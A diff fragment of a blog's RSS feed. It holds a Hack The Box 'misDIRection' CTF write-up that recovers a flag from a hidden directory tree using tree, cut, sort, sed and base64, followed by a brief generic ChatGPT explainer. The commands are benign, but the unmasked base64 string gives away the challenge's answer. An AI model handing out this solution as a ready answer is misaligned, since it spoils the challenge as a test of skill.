+&lt;h2 id=&#34;steps-for-finding-the-flag&#34;&gt;Steps for finding the flag&lt;/h2&gt;
+&lt;p&gt;Unzipping the file yields a directory with the name &lt;code&gt;.secret&lt;/code&gt;, which is hidden in unix based systems.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ unzip misDIRection.zip -d misDIRection &amp;amp; ls -a misDIRection
+. .. .secret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Checking the &lt;code&gt;.secret&lt;/code&gt; directory we get a bunch of directories with empty file contents.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ls -a
+0 2 4 6 8 a b c d e f g h i j k l m n o p q r s t u v w x y z
+1 3 5 7 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At this point we can use &lt;code&gt;tree&lt;/code&gt; to display all the files and subdirectories.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tree
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Checking the content of the files, we find that they are empty files. On another observation since the files are all numbered and distinct it can be assumed that they are keys and since the directory names are all alphanumeric they can be assumed as values and hence forming a {key, value} pair.
+Sorting the file names and taking the directory names as values we might be find the flag to our challenge.&lt;/p&gt;
+&lt;p&gt;We use tree prune to list only directories that are not empty, thereby eliminating values without keys&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ tree --prune -afi
+.
+./0
+./0/6
+./1
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We pipe the output of the tree and cut each row between “/” and take only the second and third values and put space beween them using the cut tool. Refer to the man pages of each tool to know more.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ tree --prune -afi | cut -s -d &amp;#34;/&amp;#34; -f 2,3 --output-delimiter=&amp;#34; &amp;#34; | sort -k 2n
+0
+1
+2
+5
+9
+...
+...
+S 1
+F 2
+R 3
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since there are still some directories without keys lingering in our output, we will remove them using &lt;code&gt;sed&lt;/code&gt; which will remove all rows without space.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ tree --prune -afi | cut -s -d &amp;#34;/&amp;#34; -f 2,3 --output-delimiter=&amp;#34; &amp;#34; | sort -k 2n | sed &amp;#39;/ /!d&amp;#39;
+S
+F
+R
+C
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For printing all the values, lets use &lt;code&gt;tr&lt;/code&gt; a to remove newlines form all the rows.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ tree --prune -afi | cut -s -d &amp;#34;/&amp;#34; -f 2,3 --output-delimiter=&amp;#34; &amp;#34; | sort -k 2n | sed &amp;#39;/ /!d&amp;#39; | cut -d &amp;#34; &amp;#34; -f 1 | tr -d &amp;#39;\n&amp;#39;
+SFRCe0RJUjNjdEx5XzFuX1BsNDFuX1NpN2V9
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The output values look fairly similar to base64 encoding, so let us pipe our output one more time to “base64” tool to decode it.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ tree --prune -afi | cut -s -d &amp;#34;/&amp;#34; -f 2,3 --output-delimiter=&amp;#34; &amp;#34; | sort -k 2n | sed &amp;#39;/ /!d&amp;#39; | cut -d &amp;#34; &amp;#34; -f 1 | tr -d &amp;#39;\n&amp;#39; | base64 --decode
+HTB{D********e}
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;That&amp;rsquo;s it! You have the flag.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>chatGPT</title>
+      <link>/posts/chatgpt/</link>
+      <pubDate>Fri, 30 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/chatgpt/</guid>
+      <description>ChatGPT is a variant of the GPT (Generative Pre-trained Transformer) language model developed by OpenAI. GPT is a type of artificial intelligence (AI) that is trained to generate human-like text. It does this by learning patterns in large amounts of text data and using this knowledge to generate new text that is similar in style and content to the input it was trained on.
+In the case of ChatGPT, the model is specifically designed for conversation.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://chat.openai.com&#34;&gt;ChatGPT&lt;/a&gt; is a variant of the GPT (Generative Pre-trained Transformer) language model developed by OpenAI. GPT is a type of artificial intelligence (AI) that is trained to generate human-like text. It does this by learning patterns in large amounts of text data and using this knowledge to generate new text that is similar in style and content to the input it was trained on.&lt;/p&gt;
+&lt;p&gt;In the case of ChatGPT, the model is specifically designed for conversation. It is trained on a large dataset of conversations and is able to generate responses that are appropriate for a given conversation context. This makes it useful for tasks such as chatbots and virtual assistants, where the AI needs to be able to understand and respond to user input in a natural, human-like way.&lt;/p&gt;
+&lt;p&gt;AI refers to the ability of a machine to perform tasks that would normally require human intelligence, such as understanding language, recognizing patterns, and learning from experience. There are many different types of AI, ranging from simple machine learning algorithms to more advanced systems that are able to exhibit human-like intelligence and adaptability.&lt;/p&gt;
+&lt;p&gt;One of the main goals of AI research is to develop systems that are able to learn and adapt to new situations, rather than simply following pre-programmed instructions. This is known as “machine learning,” and it is a key aspect of many modern AI systems. Machine learning algorithms are able to analyze data, identify patterns, and make predictions or decisions based on this information. They are able to improve their performance over time as they encounter more data, making them more flexible and adaptable than traditional AI systems.&lt;/p&gt;
+&lt;p&gt;In conclusion, ChatGPT is a variant of the GPT language model that is designed for conversation. It is an example of artificial intelligence, which refers to the ability of machines to perform tasks that would normally require human intelligence. Machine learning algorithms, which are able to learn and adapt to new situations, are a key aspect of many modern AI systems.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Totally not generated by chatGPT&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
